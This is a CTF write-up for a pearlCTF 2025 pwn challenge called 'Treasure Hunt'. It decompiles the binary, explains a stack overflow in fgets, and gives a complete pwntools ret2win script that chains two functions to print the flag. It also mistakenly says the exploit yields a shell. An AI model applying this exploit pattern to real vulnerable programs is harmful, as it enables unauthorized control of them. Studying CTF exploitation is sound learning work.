# Treasure Hunt

{% hint style="info" %}
Category: PWN

Difficulty: easy
{% endhint %}

## Description

> Are you worthy enough to get the treasure? Let's see...
>
> **Links**: nc treasure-hunt.ctf.pearlctf.in 30008
>
> **Files**: _treasurehunt.zip_

## Solve Walkthrough

* This is a classic ret2win challenge.
* First, I check the ELF protection with `checksec`.

```bash
[*] '/home/hurtz4eva/Nextcloud/CTF/international/pearlCTF/2025/pwn/treasurehunt/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

* The binary only have the NX / DEP protection, which means that we **can't inject a shellcode**. Let's decompile the binary using Ghidra.
* We got a bunch of interesting functions here.

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

* Here's a decompiled code of all known functions in `vuln.c`.

{% tabs %}
{% tab title="main" %}
```c
// main function.
undefined8 main(void)

{
  setup();
  puts("Welcome, traveler! Your quest for the Key of Eternity begins now...");
  enchanted_forest();
  desert_of_sands();
  ruins_of_eldoria();
  caverns_of_eternal_darkness();
  chamber_of_eternity();
  return 0;
}
```
{% endtab %}

{% tab title="check_key" %}
```c
undefined8 check_key(int param_1,char *param_2)

{
  int iVar1;
  undefined4 extraout_var;
  char *local_38 [4];
  char *local_18;
  
  local_38[0] = "whisp3ring_w00ds";
  local_38[1] = "sc0rching_dunes";
  local_38[2] = "eldorian_ech0";
  local_38[3] = "shadow_4byss";
  local_18 = "3ternal_light";
  iVar1 = strcmp(param_2,local_38[param_1]);
  return CONCAT71((int7)(CONCAT44(extraout_var,iVar1) >> 8),iVar1 == 0);
}
```
{% endtab %}

{% tab title="enchanted_forest" %}
```c
void enchanted_forest(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 1: The Enchanted Forest");
  puts(
      "Towering trees weave a dense canopy, filtering ethereal light. Ancient roots twist like serpe nts beneath your feet, hiding secrets of old."
      );
  puts("The spirits whisper secrets among the trees.");
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(0,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Enchanted Forest forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Enchanted Forest.");
  return;
}
void desert_of_sands(void)
```
{% endtab %}

{% tab title="desert_of_sands" %}
```c
void desert_of_sands(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 2: The Desert of Sands");
  puts(
      "Golden dunes stretch endlessly, the sun burning with relentless fury. Shadows of ancient ruin s break the monotony, hinting at secrets buried beneath the sands."
      );
  puts("The scorching winds test your resolve.");
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(1,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Desert of Sands forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Desert of Sands.");
  return;
}
```
{% endtab %}

{% tab title="ruins_of_eldoria" %}
```c
void ruins_of_eldoria(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 3: The Ruins of Eldoria");
  puts(
      "Once a grand citadel, now reduced to crumbling stones. Arcane symbols glow faintly, whisperin g forgotten knowledge in the language of the ancients."
      );
  puts("Echoes of ancient wisdom guide your path.");
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(2,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Ruins of Eldoria forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Ruins of Eldoria.");
  return;
}
```
{% endtab %}

{% tab title="caverns_of_eternal_darkness" %}
```c
void caverns_of_eternal_darkness(void)

{
  char cVar1;
  undefined1 local_48 [64];
  
  puts("\nLevel 4: The Caverns of Eternal Darkness");
  puts(
      "The air is thick with an eerie silence, broken only by the distant drip of unseen waters. You r torch flickers as shadows coil and dance along the jagged walls."
      );
  puts(&DAT_00402568);
  printf("Enter the mystery key to proceed: ");
  __isoc99_scanf(&DAT_00402173,local_48);
  cVar1 = check_key(3,local_48);
  if (cVar1 != '\x01') {
    puts("Wrong key! You are lost in the Caverns of Eternal Darkness forever...");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Correct! You have passed The Caverns of Eternal Darkness.");
  return;
}
```
{% endtab %}

{% tab title="chamber_of_eternity" %}
```c
void chamber_of_eternity(void)
{
  char local_48 [64];
  
  puts("\nLevel 5: The Chamber of Eternity");
  puts(
      "A vast chamber bathed in celestial light. The Key of Eternity hovers at its center, pulsing w ith cosmic energy, awaiting the one deemed worthy."
      );
  puts("A single light illuminates the Key of Eternity.");
  printf("You are worthy of the final treasure, enter the final key for the win:- ");
  getchar();
  fgets(local_48,500,stdin);
  puts("GGs");
  return;
}
```
{% endtab %}

{% tab title="setEligibility" %}
```c
void setEligibility(void)

{
  eligible = 1;
  return;
}
```
{% endtab %}

{% tab title="winTreasure" %}
```c
// win function.
void winTreasure(void)

{
  char local_58 [72];
  FILE *local_10;
  
  if (eligible == '\0') {
    puts("No flag for you!");
  }
  else {
    local_10 = fopen("flag.txt","r");
    fgets(local_58,0x40,local_10);
    puts(local_58);
  }
  return;
}
```
{% endtab %}
{% endtabs %}

* From all the function symbols above, we can see the pattern in the `main` function that is calling some functions from `unchanted_forest` (**level 1**) until `chamber_of_eternity` (**level 5**).
* What is every level/function does ? It just compared the key in each level. If it's correct, you can go to the next level until you reach out last level, which is level 5.
* After we successfully reach out to the last level, you see in the  `chamber_of_eternity` function is happen **BOF vulnerability** in `fgets` function. The buffer is only take **64 Bytes**, but we can input until **500 Bytes**.
* So, the objective is very straighforward. After we at the last level, we can do **ret2win attack** to `winTreasure` function to get the flag.
* But, another problem is we can't directly get the flag until the `eligible`  global variable is changed to **1**. How we can change it? Simple, we can jump to the `setEligibility`  function first, and then jump to the `winTreasure`  function.
* Here's my final exploit script.

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/env python3
#filename: exploit.py

from pwn import *

context.binary = elf = ELF("./vuln", checksec=0)
context.log_level = "debug"

# Prepare the payload.
win_addr = p64(elf.symbols['winTreasure'])
set_eligibility = p64(elf.symbols['setEligibility'])

key_lvl1 = b"whisp3ring_w00ds"
key_lvl2 = b"sc0rching_dunes"
key_lvl3 = b"eldorian_ech0"
key_lvl4 = b"shadow_4byss"
key_lvl5 = b"3ternal_light"

payload = b"A"*(64 - len(key_lvl5))
payload += b"B"*8
payload += set_eligibility
payload += win_addr

# Send all valid keys got from check_key function.
is_remote = True

if is_remote:
    io = remote("treasure-hunt.ctf.pearlctf.in", 30008)
else:
    io = elf.process()

# Send the valid key according to it's level.
io.sendline(key_lvl1)
io.sendline(key_lvl2)
io.sendline(key_lvl3)
io.sendline(key_lvl4)

# Send the last valid key for level 5 and also the payload to win_addr.
io.sendline(key_lvl5 + payload)
io.interactive()
```
{% endcode %}

* If we run the exploit script remotely, we can get a shell.

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

## Flag

<kbd>pearl{k33p\_0n\_r3turning\_l0l}</kbd>
